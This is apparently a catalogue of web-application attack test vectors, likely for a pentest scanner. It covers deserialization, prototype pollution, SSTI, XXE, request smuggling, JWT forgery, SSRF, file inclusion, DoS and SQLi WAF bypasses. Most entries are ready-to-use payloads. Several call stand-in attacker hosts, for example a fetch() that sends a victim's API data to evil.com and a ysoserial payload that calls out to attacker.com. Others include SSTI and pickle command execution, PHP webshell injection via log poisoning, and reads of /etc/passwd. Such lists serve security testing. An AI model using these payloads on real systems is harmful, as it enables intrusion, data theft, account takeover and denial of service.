deserialization_sink.description: Unsafe deserialization — Java/PHP/Python object deserialization leads to RCE via gadget chains
test_vectors: Java ysoserial: send base64(ysoserial CommonsCollections5 'nslookup attacker.com') — check OOB DNS for blind RCE
PHP: inject O:8:"stdClass":1:{s:4:"test";s:2:"hi";} in cookie/POST param — observe unserialize() errors or __wakeup side effects
Python pickle: send base64(pickle.dumps(os.system('id'))) in data/session field — observe command execution or 500 error
ASP.NET ViewState: decode existing ViewState, inject ysoserial .NET payload, re-encode and resend

prototype_pollution.description: Prototype pollution — __proto__/constructor manipulation in Node.js/JS bypasses auth or escalates to RCE
test_vectors: JSON body: POST with {"__proto__":{"admin":true}} then re-request restricted endpoint — check if admin access granted
URL params: GET /?__proto__[isAdmin]=1 or /?constructor[prototype][role]=admin
Merge endpoint: PUT /api/settings with {"__proto__": {"debug":true}} — verify if global debug state changes
Nested: {"a":{"__proto__":{"polluted":"yes"}}} in deep-merge operations — confirm via subsequent error messages

graphql_deep_attack.description: GraphQL — introspection, batching abuse, depth/complexity bypass, IDOR via node queries
test_vectors: Schema dump: POST /graphql {"query":"{__schema{types{name fields{name type{name}}}}}"} — find hidden mutations and sensitive types
Batching bypass: [{"query":"mutation{login(u:'admin',p:'$FUZZ')}"}] x1000 in single request to bypass rate limiting
IDOR enumeration: query {node(id:2){...on User{email role}}} incrementing IDs — access cross-account data
Field suggestion: send invalid field name — use 'Did you mean X?' error hints to discover undocumented sensitive fields

ssti_template_engine.description: Server-Side Template Injection — template engine processes user input, leading to arbitrary code execution
test_vectors: Probe: inject {{7*7}} and ${7*7} and #{7*7} in ALL string inputs — response containing 49 confirms SSTI
Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
FreeMarker RCE: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}

xxe_xml_processing.description: XXE injection — XML/SOAP/SVG external entity processing enables file read, SSRF, and data exfiltration
test_vectors: Classic: POST with Content-Type:text/xml and <!DOCTYPE f [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><f>&e;</f>
OOB blind: <!ENTITY % p SYSTEM 'http://attacker.com/'> — detect via DNS/HTTP callback using Burp Collaborator
SVG upload: <svg><image href='file:///etc/passwd'/></svg> — trigger via image render/thumbnail endpoint
SAML assertion: inject XXE in base64-decoded SAML request before re-encoding and submitting to IdP endpoint

websocket_hijacking.description: Cross-Site WebSocket Hijacking — unvalidated Origin allows attacker to send privileged WebSocket messages
test_vectors: CSWSH PoC: HTML page on attacker.com opens new WebSocket('wss://target/ws') — check if connection accepted without CSRF token
Origin bypass: send Origin: null (sandboxed iframe) or Origin: https://evil.target.com (regex check bypass)
Binary frames: send binary WebSocket frames instead of text — many parsers handle them differently and may crash or leak data
Protocol upgrade CSRF: craft cross-origin form that upgrades to WebSocket — send privileged commands as authenticated user

cache_poisoning.description: Web cache poisoning — attacker-controlled headers injected into cached responses served to all users
test_vectors: X-Forwarded-Host: attacker.com — verify if poisoned host reflects in cached response body (host-based cache poison)
X-Original-URL: /admin — some caches serve /admin cached response for / requests bypassing path-based access control
Vary header poison: inject X-Evil: <script>alert(1)</script> in unkeyed header — poison cache with XSS payload
Fat GET: send XSS payload in GET request body — cache keys only on URL, backend processes body and caches XSS

http_request_smuggling.description: HTTP Request Smuggling — TE/CL desync between frontend proxy and backend server bypasses auth and WAF
test_vectors: CL.TE: POST with Content-Length:6 + Transfer-Encoding:chunked, body '0\r\n\r\nX' — probe for backend prefix injection
TE.TE obfuscation: Transfer-Encoding: xchunked or Transfer-Encoding\x09: chunked — some backends process it, frontend ignores
H2C smuggling: send Connection: Upgrade, HTTP2-Settings + Upgrade: h2c to HTTP/1.1 endpoint — backend may process as HTTP/2
Confirm: after smuggled prefix injection, check if subsequent innocent request returns poisoned response (403→200 on /admin)

jwt_confusion_attacks.description: JWT advanced attacks — alg:none bypass, RS256/HS256 confusion, kid header injection, weak secret brute force
test_vectors: alg:none: change header to {"alg":"none"} and remove signature — send as eyJhbGciOiJub25lIn0.PAYLOAD. (trailing dot)
RS256→HS256: take server's public key from /jwks.json, sign token with HMAC-SHA256 using pubkey, set alg:HS256
kid path traversal: set kid to ../../../dev/null and sign with empty string, or kid SQL: ' UNION SELECT 'x' --
Brute force: hashcat -a 0 -m 16500 token.jwt rockyou.txt — many apps use 'secret', 'password', or app name

ssrf_via_headers.description: Header-based SSRF — Host/X-Forwarded-For/Referer headers trigger server-side requests to internal services
test_vectors: Host header injection: set Host: 169.254.169.254 — forces cloud metadata SSRF when backend reflects the Host in requests
X-Forwarded-Host: internal-service.local — test resolution of internal hostnames via header reflection
Protocol escalation: try gopher://127.0.0.1:6379/_PING (Redis), dict://127.0.0.1:11211/stats (Memcached) in URL params
Referer SSRF: Referer: http://169.254.169.254/latest/meta-data/ — some apps process/log Referer as outbound request

type_confusion_juggling.description: Type confusion/juggling — PHP loose comparison, JS coercion, integer overflow bypass authentication/validation
test_vectors: PHP magic hash: password '240610708' hashes to 0e... — PHP == comparison treats 0e... as 0 (scientific notation)
Array bypass: send username[]=admin&password[]=anything — PHP in_array() on array input causes type coercion
JSON null: send {"role":null} or {"admin":true} — some ORMs/deserialization layers bypass strict type enforcement
Integer overflow: send id=9223372036854775808 (INT64_MAX+1) — wraps to negative value, may match privileged record IDs

second_order_injection.description: Second-order injection — stored payload triggers in different security context (admin panel, export, email template)
test_vectors: Stored XSS: save in profile/name field — trigger in admin panel view
Stored SQLi: register username as admin'-- then trigger login/reset query using stored name without re-escaping
Stored SSTI: save {{config.items()}} as display name — rendered in email template or admin dashboard confirmation
CSV injection: =HYPERLINK('http://attacker.com','click') in name/note — triggers when admin exports users to CSV and opens

cors_misconfiguration.description: CORS misconfiguration — reflective/null/subdomain origin with credentials allows cross-origin session data theft
test_vectors: Reflect test: send Origin: https://evil.com — if ACAO: https://evil.com + ACAC: true, full cross-origin credential exploit
Null origin: send Origin: null — accessible from sandboxed iframe, some configs explicitly allowlist null
Subdomain takeover chain: Origin: https://sub.target.com — if subdomain is claimable, CORS bypass via takeover
PoC JS: fetch('https://target/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com?d='+JSON.stringify(d)))

debug_endpoint_exposure.description: Debug/diagnostic endpoints exposed — actuator, phpinfo, swagger leak credentials, env vars, and heap dumps
test_vectors: Spring Boot: GET /actuator/env (env vars+secrets), /actuator/heapdump (full memory), /actuator/jolokia (JMX RCE via POST)
Django DEBUG=True: trigger 500 with malformed input — get full stack trace with local variables, settings, and SECRET_KEY
PHP exposure: curl /.env, /phpinfo.php, /info.php, /server-status, /web.config — check for credentials in output
Swagger: GET /api-docs or /openapi.json — enumerate ALL endpoints including undocumented admin/internal ones

insecure_file_inclusion.description: LFI chain to RCE — file inclusion + log/session poisoning enables server-side code execution via wrapper
test_vectors: Log poisoning: inject <?php system($_GET['cmd'])?> in User-Agent header then ?file=/var/log/apache2/access.log&cmd=id
PHP session: ?file=/var/lib/php/sessions/sess_PHPSESSID — control session data via register/login to inject PHP code
PHP filter base64: ?file=php://filter/convert.base64-encode/resource=/etc/passwd — read arbitrary files encoded
Zip slip: upload archive with ../../../../var/www/html/shell.php entry — writes webshell on extraction

parameter_pollution_waf_bypass.description: HTTP Parameter Pollution — duplicate/array params exploit parser inconsistency to bypass WAF and input filters
test_vectors: Duplicate params: GET /search?q=safe&q=<script>alert(1)</script> — WAF validates first, backend uses second/last value
Array params: ?id[]=1&id[]=../../etc/passwd — some frameworks merge arrays, bypassing scalar type validation
JSON duplicate key: {"user":"normal","user":"admin"} — parsers using last-key-wins bypass WAF's first-value inspection
Null byte injection: ?q=legit%00<script> or ?file=safe.txt%00.php — null byte truncates server-side validation string

mass_assignment_priv_escalation.description: Mass assignment — REST API accepts undocumented privileged fields (admin, role, verified) for privilege escalation
test_vectors: POST /register: {"username":"x","password":"x","is_admin":true,"role":"admin","verified":true,"plan":"enterprise"}
PUT /api/profile: {"id":1,"email":"x@x.com","role":"superadmin","credits":999999,"subscription":"lifetime"}
Compare fields: GET /api/user returns {role, plan, verified} — include ALL those fields in PUT /api/user update request
readOnly bypass: find readOnly fields in Swagger schema — send them in write requests to test if backend enforces readOnly

path_traversal_evasion.description: Advanced Path Traversal — obfuscated directory traversal using encoding, Unicode, and protocol tricks
test_vectors: Double encoding: ?file=....//....//etc/passwd or %2e%2e%2f%2e%2e%2fetc/passwd — double encoding bypasses decode checks
Overlong UTF-8: ?file=....//....//etc/passwd with %c0%ae (overlong .) — Apache mod_alias bypass
Mixed encoding: ?path=/var/www/html/..%252f..%252fetc/passwd — double URL-encoding
Protocol tricks: ?file=public/../private/file.txt or ?path=/var/log/access.log%00 — null byte in some contexts
Backslash on Windows: ?file=C:\windows\system32\config\sam — mixed with forward slashes

api_graphql_introspection_bypass.description: GraphQL Introspection & Enumerations — schema discovery via field suggestions, directive abuse, and introspection bypass
test_vectors: Directive enumeration: {__schema{directives{name args{name type{name kind}}}}} — find hidden validation bypasses
Type introspection: {__schema{types{name kind fields{name args{name type{name kind}}}}}} — map entire schema structure
Field suggestion abuse: query{unknownField} — error hints reveal field names, types, and relationships
Introspection disabled bypass: send X-GraphQL-Force-Introspection: true or POST with variables {"introspection":true} — some configs honor headers
Alias enumeration: {user1:user(id:1){email} user2:user(id:2){email}...} — enumerate sensitive data via bulk queries

race_condition_toctOU.description: Time-of-Check Time-of-Use (TOCTOU) race conditions — concurrent requests exploit window between validation and execution
test_vectors: Coupon double redemption: send 100 identical POST /redeem-coupon requests simultaneously — race to use same code
Balance manipulation: send +100 transfer + -100 debit concurrently — race to exploit balance calculation window
File upload race: upload invalid file + rapidly send valid file with same name — check phase accepts invalid, write phase overwrites
Password reset race: send 50 concurrent password reset requests — bypass rate limiting, extract tokens via timing side-channel
PoC: curl -X POST /transfer -d 'amount=1000' & curl -X POST /transfer -d 'amount=-1000' & wait — observe race condition

http2_exploitation.description: HTTP/2 Protocol Exploits — stream manipulation, header compression attacks, and protocol downgrade bypass
test_vectors: Header compression attack: send 1000 requests with unique headers triggering HPACK dynamic table growth — exhaust server memory
Stream priority manipulation: send PRIORITY frames to starve legitimate streams — cause denial of service
GOAWAY flood: send continuous GOAWAY frames with increasing last stream ID — break connection handling
HTTP/1.1 downgrade: connect with h2cUpgrade, then send HTTP/1.1 request — some servers process incorrectly
CONNECTION header injection: send 'Connection: X-Ghost-Header: evil' with 'X-Ghost-Header' in SETTINGS — some proxies leak headers

business_logic_flaws.description: Business Logic Flaws — authentication/authorization bypass via workflow manipulation and edge cases
test_vectors: Price manipulation: add free item to cart, apply $100 gift card, cancel item — observe if gift card balance updates incorrectly
Invite code reuse: accept invite, create account, delete account, reuse same invite link — gift to other users
Subscription downgrade abuse: upgrade to premium, request refund immediately — some systems keep premium without payment
Sequential ID enumeration: GET /api/requests/1,2,3... — find non-sequential IDs in admin panels or internal tools
Time window exploitation: initiate refund after 48 hours but before processing completes — race business logic

resource_exhaustion_ddos.description: Resource Exhaustion Attacks — memory/CPU/flood attacks targeting specific implementation weaknesses
test_vectors: XML Bomb (Billion Laughs): <!ENTITY a "<!ENTITY b "&a;&a;&a;&a;&a;...">"> — exponential entity expansion exhausts memory
ZIP Bomb: upload compressed archive with 100GB uncompressed content — exhaust disk/Memory on extraction
Slow POST attack: send Content-Length: 1000000 but transmit 1 byte per minute — exhaust connection pool
Hash collision: send JSON with 50000 keys that all hash to same bucket — O(n²) performance degradation
Regex DoS: send input triggering catastrophic backtracking in regex validation — CPU spike, timeout

jwt_jwe_encryption_bypass.description: JWT JWE Encryption Bypass — encrypted token manipulation without decryption key
test_vectors: Recipients bypass: send token with multiple recipients, include self + admin — one recipient may have admin privileges
Empty ciphertext: send valid JWE header with empty/placeholder ciphertext — some implementations cache decrypt attempts
Alg confusion: send alg:AES-GCM with key derived from public info — exploit miscalculated encryption keys
kid injection in JWE: set kid to trigger key rotation or fallback to weak key — decrypt admin token

jwt_token_key_leak.description: JWT Key Exposure — RSA private key, HS256 secret, or JWKS endpoint misconfig enables token forgery
test_vectors: JWKS enumeration: GET /.well-known/jwks.json, /api/jwks, /auth/jwks — extract RSA public key for RS signature forging
Private key leak: search repos for 'private.key', 'jwt_secret', 'RS256' — extract signing key from config files
Fallback to HS256: if server accepts alg:HS256, use public RSA key as HMAC secret — sign arbitrary tokens
Environment variable extraction: probe /api/config, /api/v1/env, /.env.backup — leaked secrets enable token signing

grpc_injection.description: gRPC Protocol Injection — protobuf deserialization, reflection API abuse, and HTTP/2 header manipulation
test_vectors: Reflection API: enable gRPC reflection, call ListServices() — discover undocumented services and methods
Protobuf deserialization: craft malicious .proto message with custom extension — RCE via deserialization gadget chain
HTTP/2 header injection: send :method, :path with gRPC content-type — some proxies forward incorrectly formatted frames
Empty message injection: send empty protobuf message to endpoint expecting full data — default values may grant access

oauth2_deep_exploitation.description: OAuth2/OpenID Connect Advanced Attacks — code exchange bypass, state manipulation, and PKCE bypass
test_vectors: Code injection: intercept authorization code, replay to token endpoint with modified redirect_uri — bypass state cross-site forgery protection
State prediction: generate predictable state values, forge authorization URLs — execute pre-authenticated account takeover
PKCE code verifier reuse: reuse valid code_verifier after code exchange — if server doesn't invalidate, replay works
Nonce replay: use same nonce across multiple ID tokens — if not validated per-request, token reuse occurs

api_version_skewing.description: API Version Skewing — exploiting deprecated/multiple API versions for security bypass
test_vectors: Version downgrade: send /api/v2/users + X-API-Version: 1.0 — deprecated v1 may lack auth checks
Version inconsistency: request v2 endpoint but send v1 payload structure — version detection logic conflict
Accept header versioning: Accept: application/json; version=1 — some APIs read version from Accept, not path
Unpublished version: probe /api/v99, /api/alpha, /api/beta — developer branches may have debug modes or weak auth

semantic_sqli.description: Semantic SQL Injection — obfuscated SQL injection using case, encoding, and whitespace manipulation to bypass WAF
test_vectors: Case obfuscation: UniOn SeLeCt, uNiOn, UNION— some regex-based WAFs miss mixed case
Null byte injection: SELECT%00* FROM users — null byte in identifiers bypasses some filters
Comment manipulation: SE/**/LECT, ' OR 1=1 /*comment*/ — inline comments split keywords
Encoding bypass: %55NION %53ELECT (URL-encoded UNION SELECT), CHAR(85,78,73,79,78) — string-based bypass
Whitespace variants: \n\r\t\f\v injection in SQL queries — different parsers handle whitespace inconsistently
